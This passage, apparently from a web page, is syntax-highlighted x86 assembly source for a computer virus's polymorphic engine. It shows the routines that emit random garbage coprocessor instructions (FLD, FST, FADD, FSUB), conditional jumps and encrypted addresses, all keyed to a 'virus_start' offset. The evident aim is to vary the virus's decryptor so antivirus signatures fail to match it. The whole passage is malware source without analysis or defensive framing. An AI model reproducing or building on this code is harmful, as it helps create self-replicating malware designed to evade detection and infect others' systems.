        </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">ah</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">index_reg_place</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0C0h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">3Bh</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gen_garbage_no_flags</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__g_ir_compare</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gen_garbage_based</span><span class="sc0">

        </span><span class="sc1">; restore used-regs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">used_regs</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">

        </span><span class="sc1">; ready to CALL there</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__g_ir_jump</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">pusha</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">c_call_reg32</span><span class="sc0">        </span><span class="sc1">;edi-2 = call reg32 instr</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0">       </span><span class="sc1">;actualize EDI register</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gen_garbage_based</span><span class="sc0">

        </span><span class="sc1">; set JNB here</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__g_ir_compare</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc2">830Fh</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc5">a_iluzo_return</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ÄÄÄ´ generate fld/fild/fld(pi,1,ln2,lg2,l2e,l2t,z) ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

        </span><span class="sc1">;---------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;This function can save any value to copro-reg. It can be</span><span class="sc0">
        </span><span class="sc1">;from memory (real or integer) or we can use pre-defined</span><span class="sc0">
        </span><span class="sc1">;instruction like: fldpi,fldlg2,fldl2t,fldl2e and so on.</span><span class="sc0">
        </span><span class="sc1">;I don't support addressing for ESP,EBP register because</span><span class="sc0">
        </span><span class="sc1">;they've other code (two bytes) then standard (EAX,ECX...)</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc1">;input:     AL = copro-reg</span><span class="sc0">
        </span><span class="sc1">;          ESI = offset of function (fldpi,...)</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc5">__g_cm_test</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">;cjmp placed ?</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">g_copro_movin</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc1">; test if we aren't too near</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__gr_where_in_mem</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">a_copro_movin</span><span class="sc0">

        </span><span class="sc1">; use I mmx ? If yes, I can't use copro-garbage</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__mmx_test_start</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__g_cm_test</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">

        </span><span class="sc1">; select a random instruction</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,(</span><span class="sc5">end_copro_movin</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tbl_copro_movin</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc0"> </span><span class="sc2">03h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_rnd_range</span><span class="sc0">
        </span><span class="sc6">imul</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">tbl_copro_movin</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc1">; now, I'm gonna generate place in memory when I'll read</span><span class="sc0">
        </span><span class="sc1">; It's because of compatibility with the next label</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__copro_get_mem</span><span class="sc0">

        </span><span class="sc1">; select a free copro-reg</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">ppe_get_empty_reg_copro</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">  </span><span class="sc5">d_copro_movin</span><span class="sc0">

        </span><span class="sc1">; I can jump here if I'd like to save to copro-reg cartain</span><span class="sc0">
        </span><span class="sc1">; value BUT I can call this function via other parent func.</span><span class="sc0">
</span><span class="sc5">c_copro_movin</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__g_cm_test</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">d_copro_movin</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__copro_set</span><span class="sc0">     </span><span class="sc1">;set copro-reg to ST(0)</span><span class="sc0">

        </span><span class="sc1">; save used-regs</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">used_regs</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0C7DDF7D9h</span><span class="sc0">      </span><span class="sc1">;FINCSTP</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0">               </span><span class="sc1">;FFREE ST(7)</span><span class="sc0">

        </span><span class="sc6">lodsb</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">           </span><span class="sc1">;must I modify reg ?</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__cm_fldx</span><span class="sc0">

    </span><span class="sc5">__cm_new_reg</span><span class="sc4">:</span><span class="sc0">               </span><span class="sc1">;I don't want EBP,ESP</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_empty_reg</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">REG_FLAGS</span><span class="sc4">],</span><span class="sc5">REG_NO_COPRO</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__cm_new_reg</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__reg_to_bcd</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">used_regs</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_crypt_value</span><span class="sc0">     </span><span class="sc1">;crypt address</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__copro_fix_delta</span><span class="sc0">   </span><span class="sc1">;EBX to input</span><span class="sc0">

        </span><span class="sc6">lodsw</span><span class="sc0">               </span><span class="sc1">;instruction id</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;set reg</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">__cm_finish</span><span class="sc0">

    </span><span class="sc5">__cm_fldx</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">lodsw</span><span class="sc0">               </span><span class="sc1">;pre-defined instructions</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">

    </span><span class="sc5">__cm_finish</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__copro_reset</span><span class="sc0">       </span><span class="sc1">;set ST(0) back</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">used_regs</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">

        </span><span class="sc1">; test if I placed cjmp</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__g_cm_test</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">a_copro_movin</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__mmx_test_finish</span><span class="sc0">

</span><span class="sc5">a_copro_movin</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ÄÄÄ´ generate fst/fist (word/dword/qword) ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

        </span><span class="sc1">;---------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;This function loads any value from copro-reg to memory.</span><span class="sc0">
        </span><span class="sc1">;If you will want to read value from ST(6) you can also</span><span class="sc0">
        </span><span class="sc1">;call this function (c_copro_movout) and in AL you will</span><span class="sc0">
        </span><span class="sc1">;have copro-reg (by tbl_regs table).</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc1">;input:     for c_copro_movout in AL copro-reg</span><span class="sc0">
        </span><span class="sc1">;       ESI = offset of instruction</span><span class="sc0">
        </span><span class="sc1">;output:    EAX = place of value in memory</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc5">__g_cmout_test</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">;cjmp placed ?</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">g_copro_movout</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc1">; where we are in memory</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__gr_where_in_mem</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">a_copro_movout</span><span class="sc0">

        </span><span class="sc1">; may I use copro-garbage when I'm using mmx ?</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__mmx_test_start</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__g_cmout_test</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">

        </span><span class="sc1">; select a random instruction</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,(</span><span class="sc5">end_copro_movout</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tbl_copro_movout</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_rnd_range</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">tbl_copro_movout</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">*</span><span class="sc8">eax</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc1">; select a free copro-reg</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_empty_reg_copro</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">d_copro_movout</span><span class="sc0">
</span><span class="sc5">c_copro_movout</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__g_cmout_test</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">d_copro_movout</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__copro_set</span><span class="sc0">     </span><span class="sc1">;set copro-reg to ST(0)</span><span class="sc0">

    </span><span class="sc5">__cmo_new_reg</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_empty_reg</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">REG_FLAGS</span><span class="sc4">],</span><span class="sc5">REG_NO_COPRO</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__cmo_new_reg</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__reg_to_bcd</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">used_regs</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__copro_get_mem</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_crypt_value</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;eax = place of value in mem</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__copro_fix_delta</span><span class="sc0">

        </span><span class="sc6">lodsw</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__copro_reset</span><span class="sc0">       </span><span class="sc1">;set ST(0) back</span><span class="sc0">

        </span><span class="sc1">; enable register</span><span class="sc0">
        </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__reg_to_bcd</span><span class="sc0">
        </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">used_regs</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc8">ah</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;place of value in memory</span><span class="sc0">

        </span><span class="sc1">; jump placed ?</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__g_cmout_test</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">a_copro_movout</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__mmx_test_finish</span><span class="sc0">

</span><span class="sc5">a_copro_movout</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ÄÄÄ´ generate fadd/fiadd/fsub/fisub (word/dword/qword - ST(x),ST) ÃÄÄÄÄÄÄ</span><span class="sc0">

        </span><span class="sc1">;---------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;This function can generate simple math operation like is</span><span class="sc0">
        </span><span class="sc1">;FADD, FIADD, FSUB, FISUB. I also know FDIV, FCOMP, FMUL,</span><span class="sc0">
        </span><span class="sc1">;FIDIVR etc. but they use sometimes later... The very</span><span class="sc0">
        </span><span class="sc1">;interesting instruction is (FADD,...) ST(x),ST which she</span><span class="sc0">
        </span><span class="sc1">;works with ST(x) and ST (if ST=empty then ST(x)=FAIL !!)</span><span class="sc0">
        </span><span class="sc1">;Also this function can be call from other parent function</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc1">;input:      AL = copro-reg</span><span class="sc0">
        </span><span class="sc1">;       EDX = place of value in memory</span><span class="sc0">
        </span><span class="sc1">;       ESI = offset of function (fadd,...)</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc5">__g_cmath_test</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">;cjmp placed ?</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">g_copro_math</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc1">; where we are in memory</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__gr_where_in_mem</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">a_copro_math</span><span class="sc0">

        </span><span class="sc1">; use copro-garbage, when I'm using mmx ?</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__mmx_test_start</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__g_cmath_test</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">

        </span><span class="sc1">; select a random function</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,(</span><span class="sc5">end_copro_math</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tbl_copro_math</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_rnd_range</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">tbl_copro_math</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">*</span><span class="sc8">eax</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc1">; now we choose a pleasent place in memory</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__copro_get_mem</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_empty_reg_copro</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">d_copro_math</span><span class="sc0">
</span><span class="sc5">c_copro_math</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__g_cmath_test</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">d_copro_math</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__copro_set</span><span class="sc0">

        </span><span class="sc1">; save used-regs</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">used_regs</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">

        </span><span class="sc1">; I must crypt address ...</span><span class="sc0">
    </span><span class="sc5">__cmath_new_reg</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_empty_reg</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">REG_FLAGS</span><span class="sc4">],</span><span class="sc5">REG_NO_COPRO</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__cmath_new_reg</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__reg_to_bcd</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">used_regs</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_crypt_value</span><span class="sc0">     </span><span class="sc1">;crypt address</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__copro_fix_delta</span><span class="sc0">

        </span><span class="sc1">; my new instruction ...</span><span class="sc0">
        </span><span class="sc6">lodsw</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__copro_reset</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
